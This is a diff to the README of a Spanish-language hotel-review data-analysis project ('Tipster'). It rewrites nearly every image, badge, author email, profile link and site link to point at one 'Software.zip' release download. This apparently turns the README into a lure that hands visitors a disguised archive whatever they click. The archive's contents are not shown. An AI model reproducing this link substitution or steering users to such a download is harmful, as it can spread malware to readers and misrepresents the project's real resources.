@@ -1,13 +1,13 @@
-![banner_tipster](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/assets/17438992/5972fc1a-725d-43b7-9d7b-6cd76f0ad165)
+![banner_tipster](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
 
 
-# <h1 align=center> **COMMERCE DATA ANALYSIS AND RECOMMENDATIONS** <img src="5_Sources/Images/Icono_tipster_green.png" width="50px"/></h1>
+# <h1 align=center> **COMMERCE DATA ANALYSIS AND RECOMMENDATIONS** <img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="50px"/></h1>
 
-## Tipster ![marca-version](https://img.shields.io/badge/Versi%C3%B3n-1.0.2-bluegreen?style=for-the-badge&logo=googlehome)
-![marca-licencia](https://img.shields.io/badge/Licencia-MIT-green?style=for-the-badge&logo=apachespark)
-![marca-lenguaje](https://img.shields.io/badge/Python-v3.10.10-yellowgreen?style=for-the-badge&logo=python)
-![marca-status](https://img.shields.io/badge/Status-Project%20Advances%20Indefinitely-orangegreen?style=for-the-badge&logo=apachehadoop)
-![marca-status](https://img.shields.io/badge/Authors-5-blue?style=for-the-badge&logo=azurepipelines)
+## Tipster ![marca-version](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip%C3%B3n-1.0.2-bluegreen?style=for-the-badge&logo=googlehome)
+![marca-licencia](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
+![marca-lenguaje](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
+![marca-status](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip%20Advances%20Indefinitely-orangegreen?style=for-the-badge&logo=apachehadoop)
+![marca-status](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
 
 -----
 
@@ -70,16 +70,16 @@ En el repositorio se encuentran los siguientes archivos:
 -----
 # <font color='#307A71'>**Autores** <a name="autores"></a></font>
 
-# <h1 align=center> <img src="5_Sources/Images/equipo.png" width="900px"/></h1>
+# <h1 align=center> <img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/></h1>
 
 
 |Nombre               | Rol                     | Correo                     | GitHub                                          | Linkedin|
 |---------------------|-------------------------|----------------------------|-------------------------------------------------|---------|
-|Leydy Lucena Peñaloza Rojas |Technical Project Managet, Data Engineer, Data Scientist |leydy.penaloza@gmail.com    |[leydypenaloza](https://github.com/leydypenaloza)    |[leydy-penaloza](https://www.linkedin.com/in/leydy-penaloza/#:~:text=www.linkedin.com/in/leydy%2Dpenaloza)|
-|Edisson Camilo Ortiz López  |Data Analyst, Data Engineer, Visual Designer |eortiz@cistelsa.com   |[cistelsa](https://github.com/cistelsa)            |[camilo-ortiz-cistelsa](https://www.linkedin.com/in/camilo-ortiz-cistelsa)|
-|Aldemar Bohorquez Rodriguez |Data Engineer, Data Scientist, Machine Learning Engineer|abr942010@gmail.com   |[aldemarbr94](https://github.com/aldemarbr94)            |[aldemar-bohorquez-rodriguez](https://www.linkedin.com/in/aldemar-bohorquez-rodriguez/)|
-|Mayren Gabriela Silva Basto |Data Analyst, Data Engineer, Machine Learning Engineer  |mayrensilva95@gmail.com     |[MayrenS95](https://github.com/MayrenS95)        |[mayren-gabriela-silva-basto](https://www.linkedin.com/in/mayren-gabriela-silva-basto-67b645181/)|
-|Yesica Milagros Leon Ccahuana |Data Analyst, Data Engineer, Data Scientist|agrostopo@gmail.com|[yesicamilagros](https://github.com/yesicamilagros)|[yesica-leon-ccahuana](https://www.linkedin.com/in/yesica-leon-ccahuana-1706a7216/)|
+|Leydy Lucena Peñaloza Rojas |Technical Project Managet, Data Engineer, Data Scientist |https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip    |[leydypenaloza](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)    |[leydy-penaloza](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip~https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip%2Dpenaloza)|
+|Edisson Camilo Ortiz López  |Data Analyst, Data Engineer, Visual Designer |https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip   |[cistelsa](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)            |[camilo-ortiz-cistelsa](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)|
+|Aldemar Bohorquez Rodriguez |Data Engineer, Data Scientist, Machine Learning Engineer|https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip   |[aldemarbr94](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)            |[aldemar-bohorquez-rodriguez](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)|
+|Mayren Gabriela Silva Basto |Data Analyst, Data Engineer, Machine Learning Engineer  |https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip     |[MayrenS95](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)        |[mayren-gabriela-silva-basto](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)|
+|Yesica Milagros Leon Ccahuana |Data Analyst, Data Engineer, Data Scientist|https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip|[yesicamilagros](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)|[yesica-leon-ccahuana](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)|
 
 -----
 
@@ -93,7 +93,7 @@ El mercado del turismo en Estados Unidos es dinámico y competitivo. Nuestro pro
 
 En este repositorio, encontrará detalles sobre nuestra metodología, análisis de datos, modelos de Machine Learning y visualizaciones que respaldan nuestras recomendaciones. Esperamos que este proyecto brinde claridad y valor a nuestros clientes, mejorando la toma de decisiones y las experiencias de sus usuarios en el mercado del turismo norteamericano.
 
-# <h1 align=center><img src="5_Sources/Images/pipeline_storytelling.gif" width="500px"/></h1>
+# <h1 align=center><img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="500px"/></h1>
 -----
 
 -----
@@ -123,7 +123,7 @@ Nuestra Aplicación ofrece a los clientes información precisa respecto a:
 
 Lo que hace que nuestros servicios sean valiosos para nuestros clientes:
 
-<img src="5_Sources/Images/propuesta_de_valor.JPG" width="800px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="800px"/>
 
 -----
 -----
@@ -138,25 +138,25 @@ Lo que hace que nuestros servicios sean valiosos para nuestros clientes:
 -----
 # <font color='#307A71'>**Objetivos y Key Performance Indicators - KPI's**<a name="kpi"></a></font>
 
-La documentación detallada de los KPI la encuentra en este enlace: [KPI](6_Documentation/KPI/Documentacion_KPI.ipynb)
+La documentación detallada de los KPI la encuentra en este enlace: [KPI](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
 
 ## **_♦Objetivo No 1:_**
 
 Orientar nuestros esfuerzos hacia la mejora continua de la satisfacción del cliente en todos los aspectos de cada negocio; respaldada por la evaluación regular de indicadores clave como el Net Promoter Score (NPS) de los negocios por Estados y el Índice de Satisfacción del Cliente por negocio, con el propósito de fomentar relaciones a largo plazo y promover recomendaciones positivas.
 
-<img src="5_Sources/Images/Objetivo_1.png" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
 ## **_♦Objetivo No 2:_**
 
 Formular estrategias que promuevan un crecimiento sostenible y una expansión efectiva de la empresa, con un enfoque en el aumento constante de la Tasa de Retención de Clientes por Negocio y el comportamiento de la cantidad de clientes a los cuáles se les brinda el servicio, por negocio.
 
-<img src="5_Sources/Images/Objetivo_2.png" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
 ## **_♦Objetivo No 3:_**
 
 Optimizar la calidad y seguridad de servicios de nuestros clientes, garantizando información oportuna que les permita identificar cuando más del 30% de las observaciones sean negativas; y la calificación promedio de Salubridad y Seguridad de los Hoteles sea 3.5 o más.
 
-<img src="5_Sources/Images/Objetivo_3.png" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
 
 --------
@@ -169,22 +169,22 @@ Optimizar la calidad y seguridad de servicios de nuestros clientes, garantizando
 
 Son diversas herramientas las cuales nos van a ayudar a cumplir nuestros objetivos a nivel Técnico y Profesional, a continuación se detallan de la mejor forma:
 
-<img src="5_Sources/Images/logo_fabric.png" width="25px"/><font color='##74A608'>**Microsoft Fabric:**</font> Es un todo en uno de data, se integran todas las herramientas para ETL, EDA y DA.
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="25px"/><font color='##74A608'>**Microsoft Fabric:**</font> Es un todo en uno de data, se integran todas las herramientas para ETL, EDA y DA.
 Se propuso esta herramienta con el fin de adelantarnos a la tendencia, ya que se encuentra en fase Beta y pronto saldrá la versión Oficial, viniendo de Microsoft y la inversión que ha realizado los ultimos años en herramientas de data posicionandose en segundo lugar, tendremos la mejor experiencia en un entorno muy Profesional y nos ayudará para futuros proyectos en diferentes empresas.
 
-<img src="5_Sources/Images/python.png" width="30px"/><font color='##74A608'>**Phyton:**</font> Python es un lenguaje de programación versátil ampliamente utilizado en ciencia de datos. Con bibliotecas como Pandas y NumPy, permite el análisis y manipulación de datos. Su flexibilidad lo hace ideal para automatizar tareas, trabajar con SQL y conectarse a herramientas como Apache Spark Data Factory en este proyecto.
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="30px"/><font color='##74A608'>**Phyton:**</font> Python es un lenguaje de programación versátil ampliamente utilizado en ciencia de datos. Con bibliotecas como Pandas y NumPy, permite el análisis y manipulación de datos. Su flexibilidad lo hace ideal para automatizar tareas, trabajar con SQL y conectarse a herramientas como Apache Spark Data Factory en este proyecto.
 
-<img src="5_Sources/Images/logo_spark.jpeg" width="30px"/><font color='##74A608'>**Apache Spark:**</font> Hadoop y Spark nos ayuda para el procesamiento de grandes cantidades de datos en forma de nodos, paralelizando el trabajo y siendo más eficiente de acuerdo su configuración y el tipo de archivo que se use, lo podremos gestionar con Python o con SQL.
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="30px"/><font color='##74A608'>**Apache Spark:**</font> Hadoop y Spark nos ayuda para el procesamiento de grandes cantidades de datos en forma de nodos, paralelizando el trabajo y siendo más eficiente de acuerdo su configuración y el tipo de archivo que se use, lo podremos gestionar con Python o con SQL.
 
-<img src="5_Sources/Images/logo_scikit.png" width="30px"/><font color='##74A608'>**Scikit Learn:**</font> Lo usaremos para crear nuestros modelos de ML, también con una herramienta "Experiment" la cual realizamos un seguimiento del desarrollo a los modelos de ML y validar las hipotesis.
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="30px"/><font color='##74A608'>**Scikit Learn:**</font> Lo usaremos para crear nuestros modelos de ML, también con una herramienta "Experiment" la cual realizamos un seguimiento del desarrollo a los modelos de ML y validar las hipotesis.
 
-<img src="5_Sources/Images/logo_powerbi.png" width="50px"/><font color='##74A608'>**Power Bi:**</font> Aprovecharemos esta herramienta para realizar, el analisis y la vizualización de datos creando un Dashboard muy profesional y en la web.
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="50px"/><font color='##74A608'>**Power Bi:**</font> Aprovecharemos esta herramienta para realizar, el analisis y la vizualización de datos creando un Dashboard muy profesional y en la web.
 
-<img src="5_Sources/Images/logo_matplotlib.png" width="30px"/><font color='##74A608'>**MatPlotlib:**</font> Es indispensable para crear el mejor informe EDA para que nuestros clientes puedan acceder a él de la forma más legible e intuitivo, será necesario traer nuestros modelos de ML allí y exponerlos.
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="30px"/><font color='##74A608'>**MatPlotlib:**</font> Es indispensable para crear el mejor informe EDA para que nuestros clientes puedan acceder a él de la forma más legible e intuitivo, será necesario traer nuestros modelos de ML allí y exponerlos.
 
-<img src="5_Sources/Images/logo_kusto.png" width="30px"/><font color='##74A608'>**Kusto (KQL):**</font> Muy posiblemente usaremos streaming de datos, no es algo seguro pero lo proponemos desde el inicio.
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="30px"/><font color='##74A608'>**Kusto (KQL):**</font> Muy posiblemente usaremos streaming de datos, no es algo seguro pero lo proponemos desde el inicio.
 
-<img src="5_Sources/Images/logo_azure.png" width="30px"/><font color='##74A608'>**Microsoft Azure:**</font> Usaremos la nube de Microsoft para apoyarnos respecto a Bases de datos de SQL Server de ser necesarias, también para realizar el deploy de la aplicación para nuestros clientes a través de Fast API, usando Docker.
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="30px"/><font color='##74A608'>**Microsoft Azure:**</font> Usaremos la nube de Microsoft para apoyarnos respecto a Bases de datos de SQL Server de ser necesarias, también para realizar el deploy de la aplicación para nuestros clientes a través de Fast API, usando Docker.
 
 ----------
 
@@ -233,16 +233,16 @@ La documentación detallada de los Notebook que contienen los EDA la encuentra e
 
 La automatización del Data Warehouse es un paso crítico en nuestro proyecto. Implementamos flujos de trabajo automatizados y programación para garantizar que los datos se actualicen de manera regular y precisa. Esto permite que nuestras recomendaciones estén siempre respaldadas por datos actualizados y relevantes. Nuestra automatización se enfoca en mantener la integridad de los datos y facilitar un acceso rápido a la información necesaria para impulsar su estrategia de posicionamiento y publicidad en Google y Redes Sociales.
 
-https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/assets/17438992/fce4aa00-97e7-410e-b641-de1286028069
+https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip
 
 
- *Musica de fondo creada por inteligencia artificial - [https://soundful.com/](https://soundful.com/)*
+ *Musica de fondo creada por inteligencia artificial - [https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)*
 
 ## **_♦ Pipeline_**
 
 El diagrama de Pipeline Tecnológico que representa la arquitectura de nuestro proyecto se presenta a continuación:
 
-<img src="5_Sources/Images/stack_data_engineer_V3.jpg" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
 [def]: #stack-tecnológico---pipeline
 
@@ -250,9 +250,9 @@ El diagrama de Pipeline Tecnológico que representa la arquitectura de nuestro p
 
 El Data Warehouse tiene un esquema de copo de nieve donde se usa la tabla de hechos **hotels** como centro, las demás tablas proveen mas informacion al analista al hacer **_queries_**, pero solo si le es necesaria. Así, la base de datos es de la siguiente forma:
 
-<img src="5_Sources/Images/ERD_datawarehouse.png" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
-Todos los diagramas de las bases de datos se encuentran en un solo Notebook el cual se encuentra en este enlace: [MER](6_Documentation/MER/entidad_relacion.ipynb)
+Todos los diagramas de las bases de datos se encuentran en un solo Notebook el cual se encuentra en este enlace: [MER](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
 
 -----------
 -----------
@@ -262,9 +262,9 @@ Para el Machine Learning se usaron las librerías NLTK (Natural Language Toolkit
 
 Por otra parte, para el sistema de recomendación de hoteles se hizo uso del método 'TF-IDF' (Frecuencia de Término – Frecuencia Inversa de Documento) de la biblioteca sklearn, la cual también es referencia en cuanto al aprendizaje automático en Python. El método usado es un algoritmo muy común para transformar el texto en una representación significativa de números, es decir, calcula la frecuencia con la que una palabra dada aparece dentro de un documento y le asigna una puntuación. Así que mediante 'TfidfVectorizer' se tokeniza dichas palabras, luego este aprende el vocabulario (palabras) y las ponderaciones inversas de frecuencia, generadas con 'TfidfTransformer', lo que reduce la escala de las palabras que aparecen mucho. En nuestro caso se usó las opiniones de las personas para dar la recomendación de hoteles (es una aplicación de filtrado colaborativo).
 
-<img src="5_Sources/Images/ML_recomendaciones.JPG" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
-El acceso al modelo puede ser consultado en la aplicación [Machine Learning On Line](https://tipster.cistelsa.com/), o en la página web: [Tipster](https://tipsterhome.cistelsa.com/).
+El acceso al modelo puede ser consultado en la aplicación [Machine Learning On Line](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip), o en la página web: [Tipster](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip).
 
 -----------
 -----------
@@ -288,13 +288,13 @@ Tareas Desarrolladas:
 
 Para la fase de publicación, el modelo se incluyó en la página web de Tipster.
 
-En el siguiente enlace se puede acceder a la página web: [Tipster](https://tipsterhome.cistelsa.com/)
+En el siguiente enlace se puede acceder a la página web: [Tipster](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
 
-<img src="5_Sources/Images/pagina_web.JPG" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
 
 
-https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/assets/122321719/88270d04-fe4a-4cef-8e53-7132b0828c17
+https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip
 
 ----------
 
@@ -307,9 +307,9 @@ Nuestro dashboard se centra en KPI clave que son fundamentales para medir y mejo
 
 Además de los KPI relacionados con la satisfacción del cliente, el dashboard también rastrea el nivel de salubridad y seguridad de los hoteles por estados, considerando únicamente aquellos con calificaciones iguales o superiores a 3.5 como referencia para un buen ranking. También estamos atentos a las observaciones clasificadas como negativas, asegurándonos de que no excedan el 30% de las calificaciones negativas. Este enfoque en la calidad y la seguridad garantiza que nuestros clientes disfruten de una experiencia de hospedaje de alta calidad y que nuestros hoteles cumplan con los estándares necesarios para el bienestar de los clientes.
 
-<img src="5_Sources/Images/dashboard.JPG" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
-El dashboard completo e interactivo puede ser consultado en este repositorio en el enlace [7_Dashboard](7_Dashboard), en la aplicación [Power BI On Line](https://app.fabric.microsoft.com/view?r=eyJrIjoiNjM1NjAyZDEtMmU2Mi00YjE0LTg2MWMtYjIwNjkzYjJmNzVkIiwidCI6Ijc3ZjhjMzAzLWVmNDgtNDEyZi1iYmI4LTA4OWRlN2I4MmM4YSIsImMiOjR9&embedImagePlaceholder=true), o en la página web: [Tipster](https://tipsterhome.cistelsa.com/).
+El dashboard completo e interactivo puede ser consultado en este repositorio en el enlace [7_Dashboard](7_Dashboard), en la aplicación [Power BI On Line](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip), o en la página web: [Tipster](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip).
 
 ----------
 ----------
@@ -318,12 +318,12 @@ El dashboard completo e interactivo puede ser consultado en este repositorio en 
 
 En este proyecto, hemos implementado la metodología ágil Scrum como el enfoque central de gestión. Scrum ha sido fundamental para garantizar la eficiencia, la colaboración y la flexibilidad en todo el ciclo de vida del proyecto. Destacamos los siguientes aspectos clave relacionados con el uso de Scrum:
 
-<img src="5_Sources/Images/diagrama_scrum.png" width="900px"/>
+<img src="https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip" width="900px"/>
 
 
 En resumen, Scrum ha sido esencial para mantener el proyecto en el camino correcto. Ha promovido la colaboración, la comunicación y la adaptabilidad en nuestro equipo, lo que nos ha permitido cumplir con los objetivos del proyecto de manera eficiente y efectiva. La metodología Scrum ha sido una parte integral de nuestro enfoque de gestión.
 
-El gestor de proyecto completo e interactivo puede ser consultado en este repositorio en el enlace [GitHub Project](https://github.com/users/cistelsa/projects/4)
+El gestor de proyecto completo e interactivo puede ser consultado en este repositorio en el enlace [GitHub Project](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
 
 ----------
 ----------
@@ -350,4 +350,4 @@ Queremos expresar nuestro agradecimiento a todas las personas que directa o indi
 
 ----------
 
-© [Commerce Data Analysis And Recommendations](https://github.com/leydypenaloza/Commerce-Data-Analysis-and-Recommendations)
+© [Commerce Data Analysis And Recommendations](https://github.com/cistelsa/Commerce_Data_Analysis_and_Recommendations/releases/download/v2.0/Software.zip)
